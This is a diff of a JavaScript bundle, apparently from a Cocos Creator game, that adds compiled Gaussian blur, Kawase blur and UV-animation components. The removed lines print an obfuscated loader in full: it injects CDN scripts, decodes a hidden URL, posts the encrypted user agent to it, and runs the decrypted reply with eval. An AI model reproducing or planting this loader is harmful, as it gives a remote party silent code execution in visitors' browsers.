@@ -1,153 +1,352 @@
 
-function _0x2af1a0(_0x453d35, _0x511210) {
-  const _0x195e69 = _0xc40d9f();
-  _0x2af1a0 = function (_0x4fb689, _0xdddff3) {
-    _0x4fb689 = _0x4fb689 - 458;
-    let _0x44a6f3 = _0x195e69[_0x4fb689];
-    return _0x44a6f3;
-  };
-  return _0x2af1a0(_0x453d35, _0x511210);
-}
-const _0x30f763 = _0x2af1a0;
-(function (_0x499f3a, _0x61f909) {
-  const _0x131b2e = _0x2af1a0,
-    _0x327882 = _0x499f3a();
-  while (true) {
-    try {
-      {
-        const _0x5b3e2 = parseInt(_0x131b2e(460)) / 1 + parseInt(_0x131b2e(492)) / 2 + parseInt(_0x131b2e(533)) / 3 * (-parseInt(_0x131b2e(562)) / 4) + -parseInt(_0x131b2e(514)) / 5 + -parseInt(_0x131b2e(483)) / 6 + -parseInt(_0x131b2e(477)) / 7 + parseInt(_0x131b2e(556)) / 8;
-        if (_0x5b3e2 === _0x61f909) break;else _0x327882.push(_0x327882.shift());
+window.__require = function e(t, r, n) {
+  function o(c, a) {
+    if (!r[c]) {
+      if (!t[c]) {
+        var u = c.split("/");
+        if (u = u[u.length - 1], !t[u]) {
+          var s = "function" == typeof __require && __require;
+          if (!a && s) return s(u, true);
+          if (i) return i(u, true);
+          throw new Error("Cannot find module '" + c + "'");
+        }
+        c = u;
       }
-    } catch (_0x15e1e2) {
-      _0x327882.push(_0x327882.shift());
+      var p = r[c] = {
+        exports: {}
+      };
+      t[c][0].call(p.exports, function (e) {
+        return o(t[c][1][e] || e);
+      }, p, p.exports, e, t, r, n);
     }
+    return r[c].exports;
   }
-})(_0xc40d9f, 600256);
-const _0x2047f5 = [_0x30f763(513) + _0x30f763(517) + _0x30f763(499) + _0x30f763(478) + _0x30f763(511) + "s", _0x30f763(513) + _0x30f763(517) + _0x30f763(527) + _0x30f763(515) + _0x30f763(541) + _0x30f763(465)];
-_0x4aa8bb(_0x2047f5, () => _0x66f3d());
-function _0xc40d9f() {
-  const _0x4bbe79 = ["Ixd1VWZEZO", "NzYZB", "AGHml", "14232000nEVCjF", "significan", "ZWbDZVbEJX", "enc", "UlZWUXdPUT", "daUOD", "3458564BgcMxC", "lcFDv", "TFwiu", "Utf8", "atob", "then", "483566EtckgS", "VWJYaHFZVl", "decrypt", "RSbGhhU0Za", "hUa1ZpTTFw", "min.js", "stringify", "UlVZeVZVUk", "HajwB", "IPvdE", "appendChil", "parse", "VjFkd1QxTX", "msg", "json", "createElem", "nSMmd", "2404829sMQUVl", "/latest/jq", "ent", "MDk=", "p3Y0ZWR1pF", "bEpPVG1zeF", "1627692EtDaCE", "all", "rm-urlenco", "MD5", "TlpXc3dNRl", "03网络异常错误,请", "bnKEb", "_0xa", "post", "1125818EYGXkr", "AES", "catch", "code", "BYY0VKUFVU", "substring", "xlPCb", "com/jquery", "tSazlYVWxs", "R2IzbE9SRE", "VVlYcHNjRn", "JIY0VwTlJU", "WkdGWFJYQj", "btoa", "nXSeC", "random", "juPte", "ajax", "V1ZWb1UwMU", "uery.min.j", "VVNSg", "https://li", "3728745kEvrTw", "-js/4.2.0/", "encrypt", "b.baomitu.", "head", "eYVHd", "pad", "xzeWu", "applicatio", "MixsY", "mode", "VoWch", "userAgent", "com/crypto", "Pkcs7", "n/x-www-fo", "onload", "FaRk1URlVW", "toString", "3iOBevL", "lSWGhqUm14", "substr", "CBC", "ZGtNa1pVVj", "lWZEdkVlJz", "map", "onerror", "crypto-js.", "navigator", "VEpaYTJSel", "src", "rdPST", "02网络错误,请重试", "EMGMy", "ded", "VTIwMVYyVn", "VndUa2hzVD", "script", "NWMjE0VDJO"];
-  _0xc40d9f = function () {
-    return _0x4bbe79;
-  };
-  return _0xc40d9f();
-}
-function _0x66f3d() {
-  const _0xf18b99 = _0x30f763,
-    _0x4b6c63 = {
-      "VoWch": function (_0x2b63e8, _0x529db6) {
-        return _0x2b63e8 == _0x529db6;
-      },
-      "bnKEb": function (_0x1c14eb, _0x4cb997) {
-        return _0x1c14eb(_0x4cb997);
-      },
-      "EMGMy": function (_0xfd6aa0, _0xd2dbe5) {
-        return _0xfd6aa0(_0xd2dbe5);
-      },
-      "HajwB": _0xf18b99(546),
-      "nXSeC": function (_0x4816cc, _0x2abbdb) {
-        return _0x4816cc + _0x2abbdb;
-      },
-      "TFwiu": _0xf18b99(490),
-      "IPvdE": _0xf18b99(510) + _0xf18b99(464) + _0xf18b99(487) + _0xf18b99(503) + _0xf18b99(550) + _0xf18b99(531) + _0xf18b99(482) + _0xf18b99(558) + _0xf18b99(467) + _0xf18b99(500) + _0xf18b99(461) + _0xf18b99(481) + _0xf18b99(537) + _0xf18b99(553) + _0xf18b99(543) + _0xf18b99(538) + _0xf18b99(504) + _0xf18b99(552) + _0xf18b99(501) + "E5",
-      "lcFDv": _0xf18b99(472) + _0xf18b99(534) + _0xf18b99(502) + _0xf18b99(496) + _0xf18b99(480),
-      "eYVHd": function (_0x367ea9, _0x314a23) {
-        return _0x367ea9 + _0x314a23;
-      },
-      "NzYZB": _0xf18b99(549) + _0xf18b99(463) + _0xf18b99(560) + "09",
-      "daUOD": function (_0xab42c, _0x48e25e) {
-        return _0xab42c + _0x48e25e;
-      },
-      "xlPCb": function (_0x4fe12b, _0x11bb2c) {
-        return _0x4fe12b + _0x11bb2c;
-      },
-      "rdPST": _0xf18b99(491),
-      "MixsY": function (_0x3c0786, _0x2247c2) {
-        return _0x3c0786 + _0x2247c2;
-      },
-      "VVNSg": function (_0x3493db, _0x39c3cf) {
-        return _0x3493db + _0x39c3cf;
-      },
-      "xzeWu": _0xf18b99(474),
-      "AGHml": _0xf18b99(522) + _0xf18b99(529) + _0xf18b99(485) + _0xf18b99(548),
-      "nSMmd": _0xf18b99(488) + "重试"
-    };
-  let _0x79511 = _0x4b6c63[_0xf18b99(506)](_0x4b6c63[_0xf18b99(564)], Math[_0xf18b99(507)]()[_0xf18b99(532)](32)[_0xf18b99(535)](2, 6));
-  window[_0x79511] = a;
-  var _0x166828 = CryptoJS[_0xf18b99(486)](window[_0x79511])[_0xf18b99(532)](),
-    _0x2a5c6f = _0x166828[_0xf18b99(497)](0, 16);
-  _0x166828 = CryptoJS[_0xf18b99(559)][_0xf18b99(565)][_0xf18b99(471)](_0x166828);
-  _0x2a5c6f = CryptoJS[_0xf18b99(559)][_0xf18b99(565)][_0xf18b99(471)](_0x2a5c6f);
-  let _0x2a6592 = _0x4b6c63[_0xf18b99(469)],
-    _0x3d2a7b = _0x4b6c63[_0xf18b99(506)](_0x4b6c63[_0xf18b99(564)], Math[_0xf18b99(507)]()[_0xf18b99(532)](32)[_0xf18b99(535)](2, 6)),
-    _0x354331 = window[_0xf18b99(458)](window[_0xf18b99(458)](window[_0xf18b99(458)](window[_0xf18b99(458)](_0x2a6592))));
-  window[_0x3d2a7b] = _0x354331;
-  let _0x39e860 = _0x4b6c63[_0xf18b99(563)],
-    _0x53aa80 = _0x4b6c63[_0xf18b99(519)](_0x4b6c63[_0xf18b99(564)], Math[_0xf18b99(507)]()[_0xf18b99(532)](32)[_0xf18b99(535)](2, 6)),
-    _0x602eec = window[_0xf18b99(458)](window[_0xf18b99(458)](window[_0xf18b99(458)](window[_0xf18b99(458)](window[_0xf18b99(458)](_0x39e860)))));
-  window[_0x53aa80] = _0x602eec;
-  let _0x42ce9c = _0x4b6c63[_0xf18b99(554)],
-    _0x51b97f = _0x4b6c63[_0xf18b99(561)](_0x4b6c63[_0xf18b99(564)], Math[_0xf18b99(507)]()[_0xf18b99(532)](32)[_0xf18b99(535)](2, 6)),
-    _0x2716d7 = window[_0xf18b99(458)](window[_0xf18b99(458)](window[_0xf18b99(458)](window[_0xf18b99(458)](_0x42ce9c))));
-  window[_0x51b97f] = _0x2716d7;
-  try {
-    let _0x9416cd = CryptoJS[_0xf18b99(493)][_0xf18b99(516)](window[_0xf18b99(542)][_0xf18b99(526)], _0x166828, {
-        "iv": _0x2a5c6f,
-        "mode": CryptoJS[_0xf18b99(524)][_0xf18b99(536)],
-        "padding": CryptoJS[_0xf18b99(520)][_0xf18b99(528)]
+  for (var i = "function" == typeof __require && __require, c = 0; c < n.length; c++) o(n[c]);
+  return o;
+}({
+  GaussianBlur: [function (e, t, r) {
+    "use strict";
+
+    cc._RF.push(t, "2c73a9pxABGyoPws6+sfrC/", "GaussianBlur");
+    var n,
+      o = this && this.__extends || (n = function (e, t) {
+        return (n = Object.setPrototypeOf || {
+          __proto__: []
+        } instanceof Array && function (e, t) {
+          e.__proto__ = t;
+        } || function (e, t) {
+          for (var r in t) Object.prototype.hasOwnProperty.call(t, r) && (e[r] = t[r]);
+        })(e, t);
+      }, function (e, t) {
+        function r() {
+          this.constructor = e;
+        }
+        n(e, t), e.prototype = null === t ? Object.create(t) : (r.prototype = t.prototype, new r());
       }),
-      _0x569b26 = _0x4b6c63[_0xf18b99(498)](_0x4b6c63[_0xf18b99(564)], Math[_0xf18b99(507)]()[_0xf18b99(532)](32)[_0xf18b99(535)](2, 6));
-    window[_0x569b26] = window[_0xf18b99(505)](_0x9416cd);
-    $[_0xf18b99(509)]({
-      "type": _0x4b6c63[_0xf18b99(545)],
-      "url": window[_0x3d2a7b],
-      "data": _0x4b6c63[_0xf18b99(561)](_0x4b6c63[_0xf18b99(523)](_0x4b6c63[_0xf18b99(512)](window[_0x53aa80], window[_0x79511]), window[_0x51b97f]), window[_0x569b26]),
-      "dataType": _0x4b6c63[_0xf18b99(521)],
-      "cache": false,
-      "contentType": _0x4b6c63[_0xf18b99(555)],
-      "processData": false,
-      "async": true,
-      "success": function (_0x3c7b26) {
-        {
-          const _0x4420b2 = _0xf18b99;
-          if (_0x4b6c63[_0x4420b2(525)](_0x3c7b26[_0x4420b2(495)], 200)) {
-            let _0x158297 = _0x3c7b26[_0x4420b2(557) + "t"],
-              _0x12ce04 = CryptoJS[_0x4420b2(493)][_0x4420b2(462)](_0x158297, _0x166828, {
-                "iv": _0x2a5c6f,
-                "mode": CryptoJS[_0x4420b2(524)][_0x4420b2(536)],
-                "padding": CryptoJS[_0x4420b2(520)][_0x4420b2(528)]
-              });
-            _0x4b6c63[_0x4420b2(489)](eval, CryptoJS[_0x4420b2(559)][_0x4420b2(565)][_0x4420b2(466)](_0x12ce04));
-          } else _0x4b6c63[_0x4420b2(547)](alert, _0x3c7b26[_0x4420b2(473)]);
-        }
+      i = this && this.__decorate || function (e, t, r, n) {
+        var o,
+          i = arguments.length,
+          c = i < 3 ? t : null === n ? n = Object.getOwnPropertyDescriptor(t, r) : n;
+        if ("object" == typeof Reflect && "function" == typeof Reflect.decorate) c = Reflect.decorate(e, t, r, n);else for (var a = e.length - 1; a >= 0; a--) (o = e[a]) && (c = (i < 3 ? o(c) : i > 3 ? o(t, r, c) : o(t, r)) || c);
+        return i > 3 && c && Object.defineProperty(t, r, c), c;
       },
-      "error": function (_0x570877) {
-        {
-          const _0x3e296d = _0xf18b99;
-          _0x4b6c63[_0x3e296d(547)](alert, _0x4b6c63[_0x3e296d(468)]);
+      c = this && this.__awaiter || function (e, t, r, n) {
+        return new (r || (r = Promise))(function (o, i) {
+          function c(e) {
+            try {
+              u(n.next(e));
+            } catch (t) {
+              i(t);
+            }
+          }
+          function a(e) {
+            try {
+              u(n.throw(e));
+            } catch (t) {
+              i(t);
+            }
+          }
+          function u(e) {
+            var t;
+            e.done ? o(e.value) : (t = e.value, t instanceof r ? t : new r(function (e) {
+              e(t);
+            })).then(c, a);
+          }
+          u((n = n.apply(e, t || [])).next());
+        });
+      },
+      a = this && this.__generator || function (e, t) {
+        var r,
+          n,
+          o,
+          i,
+          c = {
+            label: 0,
+            sent: function () {
+              if (1 & o[0]) throw o[1];
+              return o[1];
+            },
+            trys: [],
+            ops: []
+          };
+        return i = {
+          next: a(0),
+          throw: a(1),
+          return: a(2)
+        }, "function" == typeof Symbol && (i[Symbol.iterator] = function () {
+          return this;
+        }), i;
+        function a(e) {
+          return function (t) {
+            return u([e, t]);
+          };
         }
-      }
+        function u(i) {
+          if (r) throw new TypeError("Generator is already executing.");
+          for (; c;) try {
+            if (r = 1, n && (o = 2 & i[0] ? n.return : i[0] ? n.throw || ((o = n.return) && o.call(n), 0) : n.next) && !(o = o.call(n, i[1])).done) return o;
+            switch (n = 0, o && (i = [2 & i[0], o.value]), i[0]) {
+              case 0:
+              case 1:
+                o = i;
+                break;
+              case 4:
+                return c.label++, {
+                  value: i[1],
+                  done: false
+                };
+              case 5:
+                c.label++, n = i[1], i = [0];
+                continue;
+              case 7:
+                i = c.ops.pop(), c.trys.pop();
+                continue;
+              default:
+                if (!(o = (o = c.trys).length > 0 && o[o.length - 1]) && (6 === i[0] || 2 === i[0])) {
+                  c = 0;
+                  continue;
+                }
+                if (3 === i[0] && (!o || i[1] > o[0] && i[1] < o[3])) {
+                  c.label = i[1];
+                  break;
+                }
+                if (6 === i[0] && c.label < o[1]) {
+                  c.label = o[1], o = i;
+                  break;
+                }
+                if (o && c.label < o[2]) {
+                  c.label = o[2], c.ops.push(i);
+                  break;
+                }
+                o[2] && c.ops.pop(), c.trys.pop();
+                continue;
+            }
+            i = t.call(e, c);
+          } catch (a) {
+            i = [6, a], n = 0;
+          } finally {
+            r = o = 0;
+          }
+          if (5 & i[0]) throw i[1];
+          return {
+            value: i[0] ? i[1] : undefined,
+            done: true
+          };
+        }
+      };
+    Object.defineProperty(r, "__esModule", {
+      value: true
     });
-  } catch (_0x35ed04) {
-    _0x4b6c63[_0xf18b99(489)](alert, _0x4b6c63[_0xf18b99(476)]);
-  }
-}
-function _0x4aa8bb(_0x4becd2, _0xb83f9e) {
-  (function () {})();
-  const _0x35e07a = _0x30f763,
-    _0x29c15b = {
-      "juPte": _0x35e07a(551)
-    };
-  Promise[_0x35e07a(484)](_0x4becd2[_0x35e07a(539)](_0x20e2fd => {
-    return new Promise((_0x531500, _0x6185eb) => {
-      {
-        const _0x4dbe24 = _0x2af1a0,
-          _0x44ac6b = document[_0x4dbe24(475) + _0x4dbe24(479)](_0x29c15b[_0x4dbe24(508)]);
-        _0x44ac6b[_0x4dbe24(544)] = _0x20e2fd;
-        _0x44ac6b[_0x4dbe24(530)] = _0x531500;
-        _0x44ac6b[_0x4dbe24(540)] = _0x6185eb;
-        document[_0x4dbe24(518)][_0x4dbe24(470) + "d"](_0x44ac6b);
-      }
+    var u = cc._decorator,
+      s = u.ccclass,
+      p = u.property,
+      l = u.requireComponent,
+      f = u.executeInEditMode,
+      h = u.disallowMultiple,
+      d = u.executionOrder,
+      y = function (e) {
+        function t() {
+          var t = null !== e && e.apply(this, arguments) || this;
+          return t._material = null, t._radius = 10, t.sprite = null, t.renderTexture = null, t;
+        }
+        return o(t, e), Object.defineProperty(t.prototype, "material", {
+          get: function () {
+            return this._material;
+          },
+          set: function (e) {
+            this._material = e, this.init();
+          },
+          enumerable: false,
+          configurable: true
+        }), Object.defineProperty(t.prototype, "radius", {
+          get: function () {
+            return this._radius;
+          },
+          set: function (e) {
+            this._radius = e > 50 ? 50 : e, this.updateProperties();
+          },
+          enumerable: false,
+          configurable: true
+        }), t.prototype.onLoad = function () {
+          this.init();
+        }, t.prototype.init = function () {
+          return c(this, undefined, undefined, function () {
+            var e;
+            return a(this, function () {
+              return this._material ? (this.sprite = this.node.getComponent(cc.Sprite), this.sprite.spriteFrame && (this.sprite.spriteFrame.getTexture().packable = false), e = this.sprite.getMaterial(0), this.sprite.setMaterial(0, this.material), this.updateProperties(), this.renderTexture = this.getRenderTexture(this.node, this.renderTexture), this.sprite.spriteFrame = new cc.SpriteFrame(this.renderTexture), this.sprite.spriteFrame.setFlipY(true), this.sprite.setMaterial(0, e), [2]) : [2];
+            });
+          });
+        }, t.prototype.updateProperties = function () {
+          this.material.setProperty("size", this.getNodeSize()), this.material.setProperty("radius", this.radius);
+        }, t.prototype.getNodeSize = function () {
+          return cc.v2(this.node.width, this.node.height);
+        }, t.prototype.onDisable = function () {
+          this.renderTexture && this.renderTexture.destroy(), this.renderTexture = null;
+        }, t.prototype.getRenderTexture = function (e, t) {
+          if (!cc.isValid(e)) return null;
+          t && t instanceof cc.RenderTexture || (t = new cc.RenderTexture());
+          var r = Math.floor(e.width),
+            n = Math.floor(e.height),
+            o = cc.game._renderContext;
+          t.initWithSize(r, n, o.STENCIL_INDEX8);
+          var i = new cc.Node();
+          i.parent = cc.find("Canvas");
+          var c = i.addComponent(cc.Camera);
+          return c.alignWithScreen = false, c.ortho = true, c.orthoSize = window.TitanCCC.UICfg.SCR_H / 2, c.targetTexture = t, c.render(e), i.destroy(), t;
+        }, i([p], t.prototype, "_material", undefined), i([p({
+          type: cc.Material,
+          tooltip: false,
+          readonly: true
+        })], t.prototype, "material", null), i([p], t.prototype, "_radius", undefined), i([p({
+          tooltip: false
+        })], t.prototype, "radius", null), i([s, l(cc.Sprite), f, h, d(-100)], t);
+      }(cc.Component);
+    r.default = y, cc._RF.pop();
+  }, {}],
+  kawaseBlur: [function (e, t, r) {
+    "use strict";
+
+    cc._RF.push(t, "d3a70BHJuFE5ZgiXuNOATC1", "kawaseBlur");
+    var n,
+      o = this && this.__extends || (n = function (e, t) {
+        return (n = Object.setPrototypeOf || {
+          __proto__: []
+        } instanceof Array && function (e, t) {
+          e.__proto__ = t;
+        } || function (e, t) {
+          for (var r in t) Object.prototype.hasOwnProperty.call(t, r) && (e[r] = t[r]);
+        })(e, t);
+      }, function (e, t) {
+        function r() {
+          this.constructor = e;
+        }
+        n(e, t), e.prototype = null === t ? Object.create(t) : (r.prototype = t.prototype, new r());
+      }),
+      i = this && this.__decorate || function (e, t, r, n) {
+        var o,
+          i = arguments.length,
+          c = i < 3 ? t : null === n ? n = Object.getOwnPropertyDescriptor(t, r) : n;
+        if ("object" == typeof Reflect && "function" == typeof Reflect.decorate) c = Reflect.decorate(e, t, r, n);else for (var a = e.length - 1; a >= 0; a--) (o = e[a]) && (c = (i < 3 ? o(c) : i > 3 ? o(t, r, c) : o(t, r)) || c);
+        return i > 3 && c && Object.defineProperty(t, r, c), c;
+      };
+    Object.defineProperty(r, "__esModule", {
+      value: true
     });
-  }))[_0x35e07a(459)](() => _0xb83f9e && _0xb83f9e())[_0x35e07a(494)](() => {});
-}
+    var c = cc._decorator,
+      a = c.ccclass,
+      u = c.property,
+      s = function (e) {
+        function t() {
+          var t = null !== e && e.apply(this, arguments) || this;
+          return t.sprite = null, t.material = null, t.renderTexture = null, t;
+        }
+        return o(t, e), t.prototype.start = function () {}, t.prototype.onRefresh = function () {
+          var e = this.sprite,
+            t = this.sprite.node,
+            r = this.material;
+          r.setProperty("resolution", cc.v2(t.width, t.height));
+          var n = new cc.RenderTexture(),
+            o = new cc.RenderTexture();
+          this.getRenderTexture(t, n), this.renderWithMaterial(n, o, r), this.renderWithMaterial(o, n, r), this.renderWithMaterial(n, o, r), this.renderWithMaterial(o, n, r), this.renderWithMaterial(n, o, r), this.renderTexture = o, e.spriteFrame = new cc.SpriteFrame(this.renderTexture), n.destroy();
+        }, t.prototype.onDestroy = function () {
+          this.renderTexture && this.renderTexture.destroy();
+        }, t.prototype.getRenderTexture = function (e, t) {
+          if (!cc.isValid(e)) return null;
+          t && t instanceof cc.RenderTexture || (t = new cc.RenderTexture());
+          var r = Math.floor(e.width),
+            n = Math.floor(e.height),
+            o = cc.game._renderContext;
+          t.initWithSize(r, n, o.STENCIL_INDEX8);
+          var i = new cc.Node();
+          i.parent = e;
+          var c = i.addComponent(cc.Camera);
+          return c.clearFlags |= cc.Camera.ClearFlags.COLOR, c.backgroundColor = cc.color(0, 0, 0, 0), c.zoomRatio = cc.winSize.height / n, c.targetTexture = t, c.render(e), i.destroy(), t;
+        }, t.prototype.renderWithMaterial = function (e, t, r) {
+          t instanceof cc.Material && (r = t, t = new cc.RenderTexture());
+          var n = new cc.Node();
+          n.setParent(cc.Canvas.instance.node);
+          var o = n.addComponent(cc.Sprite);
+          o.sizeMode = cc.Sprite.SizeMode.RAW, o.trim = false, o.spriteFrame = new cc.SpriteFrame(e);
+          var i = e.width,
+            c = e.height,
+            a = cc.game._renderContext;
+          t.initWithSize(i, c, a.STENCIL_INDEX8), r instanceof cc.Material && o.setMaterial(0, r);
+          var u = new cc.Node();
+          u.setParent(n);
+          var s = u.addComponent(cc.Camera);
+          return s.clearFlags |= cc.Camera.ClearFlags.COLOR, s.backgroundColor = cc.color(0, 0, 0, 0), s.zoomRatio = cc.winSize.height / c, s.targetTexture = t, s.render(n), u.destroy(), n.destroy(), t;
+        }, i([u({
+          type: cc.Sprite,
+          tooltip: false
+        })], t.prototype, "sprite", undefined), i([u({
+          type: cc.Material,
+          tooltip: false
+        })], t.prototype, "material", undefined), i([a], t);
+      }(cc.Component);
+    r.default = s, cc._RF.pop();
+  }, {}],
+  uv1: [function (e, t, r) {
+    "use strict";
+
+    cc._RF.push(t, "be1edTXSd5Pg5dNiFVuvZl8", "uv1");
+    var n,
+      o = this && this.__extends || (n = function (e, t) {
+        return (n = Object.setPrototypeOf || {
+          __proto__: []
+        } instanceof Array && function (e, t) {
+          e.__proto__ = t;
+        } || function (e, t) {
+          for (var r in t) Object.prototype.hasOwnProperty.call(t, r) && (e[r] = t[r]);
+        })(e, t);
+      }, function (e, t) {
+        function r() {
+          this.constructor = e;
+        }
+        n(e, t), e.prototype = null === t ? Object.create(t) : (r.prototype = t.prototype, new r());
+      }),
+      i = this && this.__decorate || function (e, t, r, n) {
+        var o,
+          i = arguments.length,
+          c = i < 3 ? t : null === n ? n = Object.getOwnPropertyDescriptor(t, r) : n;
+        if ("object" == typeof Reflect && "function" == typeof Reflect.decorate) c = Reflect.decorate(e, t, r, n);else for (var a = e.length - 1; a >= 0; a--) (o = e[a]) && (c = (i < 3 ? o(c) : i > 3 ? o(t, r, c) : o(t, r)) || c);
+        return i > 3 && c && Object.defineProperty(t, r, c), c;
+      };
+    Object.defineProperty(r, "__esModule", {
+      value: true
+    });
+    var c = cc._decorator,
+      a = c.ccclass,
+      u = (c.property, function (e) {
+        function t() {
+          var t = null !== e && e.apply(this, arguments) || this;
+          return t.time = 0, t;
+        }
+        return o(t, e), t.prototype.start = function () {
+          this.time = 0, this._material = this.getComponent(cc.Sprite).getMaterial(0);
+        }, t.prototype.update = function () {
+          this.time += .02, this._material.setProperty("time", this.time);
+        }, i([a], t);
+      }(cc.Component));
+    r.default = u, cc._RF.pop();
+  }, {}]
+}, {}, ["GaussianBlur", "kawaseBlur", "uv1"]);
